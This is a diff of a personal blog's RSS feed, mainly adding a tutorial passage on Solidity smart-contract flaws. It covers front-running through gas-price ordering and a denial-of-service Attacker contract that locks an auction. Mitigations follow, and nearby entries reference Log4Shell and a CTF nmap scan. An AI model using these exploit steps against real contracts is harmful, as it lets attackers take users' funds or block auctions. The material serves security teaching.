+&lt;p&gt;In Ethereum or any other chain, every transaction is first added to the mempool and then a miner adds the transaction to the blockchain while mining. There is a time gap of around 10 seconds or more between this two process: sending a transaction and getting it accepted into blockchain.&lt;/p&gt;
+&lt;p&gt;To recreate the flaw, let create the following scenario:&lt;/p&gt;
+&lt;p&gt;Deploy a ERC20 token as follow:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;@&lt;/span&gt;openzeppelin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;contracts&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;token&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ERC20&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ERC20&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sol&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;contract LOL is ERC20 {
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    constructor() ERC20(&amp;#34;&lt;/span&gt;LOL&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;, &amp;#34;&lt;/span&gt;LOL&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        _mint&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 100000&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now deploy a &lt;code&gt;Marketplace&lt;/code&gt; contract which uses the above ERC20 token buying and selling:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;contract MarketPlace &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    address &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; owner&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    mapping&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; uint256&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; prices&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    mapping&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; holder&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    LOL lol&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+    constructor&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address a_&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+        owner &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+        lol &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LOL&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;a_&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    function &lt;span style=&#34;color:#a6e22e&#34;&gt;buy&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 id&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        lol&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;transferFrom&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; owner&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; prices&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]);&lt;/span&gt;
+        holder&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    function &lt;span style=&#34;color:#a6e22e&#34;&gt;changeprice&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 id&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; uint256 new_price&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        prices&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_price&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First use &lt;code&gt;changePrice(1,10)&lt;/code&gt; to set price of id 1 to 10. Now use two different metamask wallets, let A and B to do the attack. A will change the price and B will buy the id 1.
+Before performing this approve &lt;code&gt;Marketplace&lt;/code&gt; contract for spending the ERC20 token on behalf of B, using the &lt;code&gt;approve(spender,amount)&lt;/code&gt; function. Set the amount higher than the price to make the attack possible. To be safe always approve only the price in real scenarios.&lt;/p&gt;
+&lt;p&gt;Now call the following functions in order:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;buy(1)&lt;/code&gt; from B with lower gasprice, so that it takes more time to get accepted. Remember at this point the price of id 1 is 10, so 10 should be deducted from B&amp;rsquo;s wallet.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;changePrice(1,50)&lt;/code&gt; from A with higher gasprice, so that it is accepted instantly.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;After both the transactions are complete, you will see 50 is deducted from B wallet.&lt;/p&gt;
+&lt;h4 id=&#34;scenario-2&#34;&gt;Scenario 2&lt;/h4&gt;
+&lt;p&gt;There can be another scenario for this attack. Imagine you created a Quiz contract and the first one to respond with correct answer wins ether. Now a valid winner submits his answer in the mempool. A malicious miner notice that transaction, copies the values and send a transaction with the correct answer. If the miner&amp;rsquo;s transaction gets added to the block, he will win the ether instead of the actual winner.&lt;/p&gt;
+&lt;h4 id=&#34;how-to-mitigate-2&#34;&gt;How to mitigate&lt;/h4&gt;
+&lt;p&gt;We can&amp;rsquo;t prevent front-run but we can follow necessary steps based on the scenario.
+For example in the first scenario, only approve for the amount shown as price.
+In the second scenario, we can use some kind of encryption to hide the answer from public.&lt;/p&gt;
+&lt;h1 id=&#34;dos-attacks&#34;&gt;DoS Attacks&lt;/h1&gt;
+&lt;p&gt;DoS Attack occurs when a malicious hacker succeeds in creating a scenario where your contract functions always fails. For example if we consider the following &lt;code&gt;Auction&lt;/code&gt; contract:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+contract Auction &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    address &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; curWinner&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    uint256 &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; curBid&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    
+    function &lt;span style=&#34;color:#a6e22e&#34;&gt;bid&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; payable external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        uint256 value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+        require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; curBid&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;curWinner &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+            payable&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;curWinner&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;transfer&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;curBid&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+        curWinner &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+        curBid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here while bidding, the function first send the value of 2nd highest bid back and then updates the &lt;code&gt;curBid&lt;/code&gt; and &lt;code&gt;curWinner&lt;/code&gt;. If a hacker creates a contract through which he can place a bid but any transfer back to the contract will always fail then the winner will never update and he will be winner with any bid. The hacker can achive that using the following &lt;code&gt;Attacker&lt;/code&gt; contract:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;contract Attacker&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    Auction auction&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+    constructor&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address a&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+        auction &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Auction&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    function &lt;span style=&#34;color:#a6e22e&#34;&gt;placeBid&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; payable external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        auction&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bid&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;value&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}();&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    receive&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; external payable  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        revert&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hacked&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In &lt;code&gt;Attacker&lt;/code&gt; contract, ether cannot be transferred back as the fallback function &lt;code&gt;receive()&lt;/code&gt; will always revert it.&lt;/p&gt;
+&lt;p&gt;Another scenario includes looping over dynamic size arrays. If the array becomes too large than it will run out of gas and revert.&lt;/p&gt;
+&lt;h4 id=&#34;how-to-mitigate-3&#34;&gt;How to mitigate&lt;/h4&gt;
+&lt;p&gt;To avoid function failure due to transfer failure, implement pull over push pattern. In this pattern, you will not send the amount while calling the &lt;code&gt;bid()&lt;/code&gt; function but a separate function will be there so that the losing bidders can withdraw their bids.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/crytic/not-so-smart-contracts&#34;&gt;(Not So) Smart Contracts&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/coinmonks/smart-contracts-common-vulnerabilities-solidity-e64c5506b7f4&#34;&gt;Smart Contracts common vulnerabilities (solidity)&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</content>
+    </item>
+    
+    <item>
       <title>Erc Standards</title>
       <link>https://somesh-banerjee.github.io/blogs/posts/erc-standards/</link>
       <pubDate>Mon, 30 May 2022 15:55:13 +0530</pubDate>
@@ -102,7 +318,7 @@ Image Source: &lt;a href=&#34;https://www.blockchain-council.org/wp-content/uplo
       
       <guid>https://somesh-banerjee.github.io/blogs/posts/log4shell/</guid>
       <description>Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
-logging.ERROR(&amp;quot;error&amp;quot;);logging.WARN(&amp;quot;warning&amp;quot;);Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
+logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
       <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;logging.ERROR(&amp;quot;error&amp;quot;);
@@ -158,7 +374,7 @@ The code just sends a reverse shell to the attacker.&lt;/p&gt;
 Points: 20
 Difficulty: Easy
 ip = 10.10.10.247
-nmap scan PORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| fingerprint-strings:| NULL:|_ SSH-2.0-SSH Server - Banana Studio| ssh-hostkey:|_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)4501/tcp closed unknown5555/tcp filtered freeciv7135/tcp closed unknown8705/tcp closed unknown17330/tcp closed unknown17338/tcp closed unknown20873/tcp closed unknown25959/tcp closed unknown32381/tcp closed unknown33431/tcp closed unknown36745/tcp open unknown| fingerprint-strings:| GenericLines:| HTTP/1.</description>
+nmap scan PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 4501/tcp closed unknown 5555/tcp filtered freeciv 7135/tcp closed unknown 8705/tcp closed unknown 17330/tcp closed unknown 17338/tcp closed unknown 20873/tcp closed unknown 25959/tcp closed unknown 32381/tcp closed unknown 33431/tcp closed unknown 36745/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
       <content>&lt;p&gt;OS: Android&lt;br&gt;
 Points: 20&lt;br&gt;
 Difficulty: Easy&lt;/p&gt;
